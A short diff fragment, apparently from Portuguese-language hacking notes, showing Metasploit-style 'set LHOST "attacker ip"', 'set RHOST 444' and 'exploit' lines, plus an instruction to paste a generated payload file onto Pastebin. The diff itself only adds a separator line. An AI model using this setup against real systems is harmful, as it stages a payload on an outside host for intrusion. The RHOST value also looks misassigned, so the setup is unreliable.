@@ -19,6 +19,8 @@ set LHOST "attacker ip"
 set RHOST 444
 exploit
 
+=========================================================
+
 #Jogue o codigo criado no arquivo "payload.txt" no Pastebin:
 
 https://pastebin.com/
